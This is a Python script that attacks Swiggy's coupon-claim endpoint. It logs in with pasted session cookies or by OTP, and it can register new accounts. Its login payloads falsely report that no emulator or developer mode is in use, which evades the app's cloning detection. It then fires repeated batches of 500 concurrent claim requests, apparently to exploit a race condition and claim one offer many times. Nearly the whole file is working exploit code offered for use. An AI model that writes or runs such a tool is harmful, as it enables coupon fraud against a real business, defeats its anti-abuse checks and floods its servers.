import requests
import uuid
import secrets
import random
import string
import concurrent.futures
import json


# ==========================================================
# PASTE YOUR ACCOUNT COOKIES / SESSION JSON HERE
# ==========================================================
ACCOUNT_COOKIES = {}
# ==========================================================


def generate_swiggy_sid():
    random_char = random.choice(string.ascii_lowercase)
    return f"ow{random_char}{str(uuid.uuid4())}"


def send_single_claim(session, claim_url, headers):
    try:
        response = session.post(claim_url, headers=headers, json={}, timeout=5)
        if response.status_code != 200:
            return False, f"HTTP Error {response.status_code}"

        res_json = response.json()
        if res_json.get("status_message") == "success" or res_json.get("status_code") == 1:
            return True, "Success"
        else:
            return False, res_json.get("status_message", "Failed")
    except Exception as e:
        return False, str(e)


def parallel_claim_offers(token, tid, sid=None, device_id=None):
    claim_url = "https://events.swiggy.com/api/pick-your-offer-coupon"

    headers = {
        "Host": "events.swiggy.com",
        "sec-ch-ua-platform": '"Android"',
        "user-agent": "Mozilla/5.0 (Linux; Android 16; CPH2585 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/153.0.8010.36 Mobile Safari/537.36",
        "offerindex": "1",
        "content-type": "application/json",
        "token": token,
        "tid": tid,
        "accept": "*/*",
        "origin": "https://events.swiggy.com",
        "x-requested-with": "in.swiggy.android",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://events.swiggy.com/pick-your-offer",
        "accept-language": "en-IN,en-US;q=0.9,en;q=0.8"
    }

    if sid:
        headers["sid"] = sid
    if device_id:
        headers["deviceid"] = device_id
        headers["swuid"] = device_id

    session = requests.Session()
    batch_size = 500
    batch_count = 1

    print(f"\n[+] Starting parallel claims with batch size: {batch_size}...")

    while True:
        print(f"\n--- Batch #{batch_count} (Firing {batch_size} requests) ---")
        stop_trigger = False
        failure_reason = ""
        success_in_batch = 0

        with concurrent.futures.ThreadPoolExecutor(max_workers=batch_size) as executor:
            futures = [executor.submit(send_single_claim, session, claim_url, headers) for _ in range(batch_size)]

            for future in concurrent.futures.as_completed(futures):
                success, msg = future.result()
                if success:
                    success_in_batch += 1
                    print("✅ Claim Successful!")
                else:
                    stop_trigger = True
                    failure_reason = msg
                    print(f"❌ Claim Stopped / Error: {msg}")

        if stop_trigger:
            print(f"\n[!] Stopped due to non-success response or error. Reason: {failure_reason}")
            break

        batch_count += 1


# ==========================================================
# PASTE-COOKIES PROMPT  (auto-stops when JSON is complete)
# ==========================================================
def prompt_for_cookies():
    print("\n" + "=" * 60)
    print("  Paste your Swiggy session JSON below.")
    print("  It will detect the closing '}' automatically.")
    print("  (You can also type END or press Ctrl+D when done.)")
    print("=" * 60 + "\n")

    lines = []
    brace_balance = 0
    started = False

    while True:
        try:
            line = input()
        except EOFError:
            break

        stripped = line.strip()

        if stripped.upper() == "END":
            break

        lines.append(line)

        brace_balance += line.count("{") - line.count("}")
        if "{" in line:
            started = True

        if started and brace_balance == 0:
            break

    raw = "\n".join(lines).strip()
    if not raw:
        print("❌ No input received.")
        return None

    if brace_balance > 0:
        raw += "\n" + ("}" * brace_balance)
        print(f"[i] Auto-appended {brace_balance} closing brace(s).")

    try:
        data = json.loads(raw)
    except json.JSONDecodeError as e:
        print(f"❌ Invalid JSON: {e}")
        return None

    if not isinstance(data, dict):
        print("❌ Expected a JSON object {...}")
        return None

    if not data.get("token") or not data.get("tid"):
        print("❌ JSON must contain at least 'token' and 'tid'.")
        return None

    return data


# ==========================================================
# LOGIN VIA ACCOUNT COOKIES / SESSION JSON
# ==========================================================
def login_via_cookies(cookie_data=None):
    print("\n[+] Logging in via account cookies...")

    if cookie_data is None and ACCOUNT_COOKIES:
        cookie_data = ACCOUNT_COOKIES

    if cookie_data is None:
        cookie_data = prompt_for_cookies()
        if cookie_data is None:
            print("❌ Cookie login aborted.")
            return

    token = cookie_data.get("token")
    tid = cookie_data.get("tid")
    sid = cookie_data.get("sid")
    device_id = cookie_data.get("deviceId")

    if not token or not tid:
        print("❌ Missing 'token' or 'tid' in cookie data. Aborting.")
        return

    print(f"✅ Session loaded for mobile: {cookie_data.get('mobile', 'N/A')}")
    print(f"✅ customerId: {cookie_data.get('customerId', 'N/A')}")
    print(f"✅ deviceId:   {device_id or 'N/A'}")
    print(f"✅ sid:        {sid or 'N/A'}")

    parallel_claim_offers(token, tid, sid=sid, device_id=device_id)


# ==========================================================
# LOGIN VIA OTP (existing flow)
# ==========================================================
def login_and_signup():
    session = requests.Session()
    current_sid = generate_swiggy_sid()
    current_tid = str(uuid.uuid4())
    current_device_id = secrets.token_hex(8)

    headers = {
        "Host": "profile.swiggy.com",
        "User-Agent": "Swiggy-Android",
        "Content-Type": "application/json; charset=utf-8",
        "pl-version": "120",
        "version-code": "1585",
        "app-version": "4.99.0",
        "os-version": "11",
        "accessibility_enabled": "false",
        "x-network-quality": "POOR",
        "latitude": "0.0",
        "longitude": "0.0",
        "Accept": "application/json; charset=utf-8",
        "sid": current_sid,
        "tid": current_tid,
        "swuid": current_device_id,
        "deviceid": current_device_id
    }

    mobile_number = input("Enter mobile number: ")
    otp_url = "https://profile.swiggy.com/api/v3/app/sms_otp"

    try:
        response_otp = session.get(otp_url, headers=headers, params={"mobile": mobile_number})
        if response_otp.status_code == 200:
            otp_data = response_otp.json()
            if otp_data.get("statusMessage") == "done successfully":
                print("✅ OTP Sent Successfully!")

                server_tid = otp_data.get("tid")
                server_sid = otp_data.get("sid")
                server_device = otp_data.get("deviceId")

                if server_sid: headers["sid"] = server_sid
                if server_tid: headers["tid"] = server_tid
                if server_device:
                    headers["deviceid"] = server_device
                    headers["swuid"] = server_device
            else:
                print(f"❌ Failed to send OTP: {otp_data.get('statusMessage')}")
                return
        else:
            print(f"❌ HTTP Error: {response_otp.status_code}")
            return
    except Exception as e:
        print(f"❌ Connection Error: {e}")
        return

    otp_input = input("Enter the OTP received: ")

    verify_url = "https://profile.swiggy.com/api/v3/app/login/verify?otp_source=Sms-automatic"
    verify_payload = {
        "cloningSignalsData": {
            "appFilesDirPathInvalid": 0,
            "developerModeEnabled": 0,
            "deviceModelVmos": 0,
            "emulatorStatus": 0,
            "packageName": "in.swiggy.android",
            "workProfileEnabled": 0
        },
        "otp": otp_input
    }

    auth_token = None
    final_tid = headers.get("tid")

    try:
        response_verify = session.post(verify_url, headers=headers, json=verify_payload)
        verify_json = response_verify.json()
        data_obj = verify_json.get("data", {})

        if "token" in data_obj:
            auth_token = data_obj["token"]
            final_tid = verify_json.get("tid", final_tid)
            print("✅ Login Successful!")

        elif data_obj.get("registered") is False or "token" not in data_obj:
            signup_url = "https://profile.swiggy.com/api/v3/app/signup"
            signup_payload = {
                "cloningSignalsData": {
                    "appFilesDirPathInvalid": 0,
                    "developerModeEnabled": 0,
                    "deviceModelVmos": 0,
                    "emulatorStatus": 0,
                    "packageName": "in.swiggy.android",
                    "workProfileEnabled": 0
                },
                "signUp": {
                    "email": "",
                    "mobile": mobile_number,
                    "name": "SaM Akk"
                }
            }

            response_signup = session.post(signup_url, headers=headers, json=signup_payload)
            signup_json = response_signup.json()
            signup_data = signup_json.get("data", {})

            auth_token = signup_data.get("token")
            final_tid = signup_json.get("tid", final_tid)
            print("✅ Signup Successful!")

        else:
            print("❌ Login/Verification Failed.")
            return

        if auth_token:
            parallel_claim_offers(auth_token, final_tid)
        else:
            print("❌ Token not found. Claim aborted.")

    except Exception as e:
        print(f"❌ Error: {e}")


if __name__ == "__main__":
    print("=" * 55)
    print("  Select Login Mode")
    print("=" * 55)
    print("  1) Login via Account Cookies (paste JSON)")
    print("  2) Login via Mobile + OTP")
    print("=" * 55)

    choice = input("Enter choice [1/2] (default 1): ").strip() or "1"

    if choice == "1":
        login_via_cookies()
    elif choice == "2":
        login_and_signup()
    else:
        print("❌ Invalid choice. Exiting.")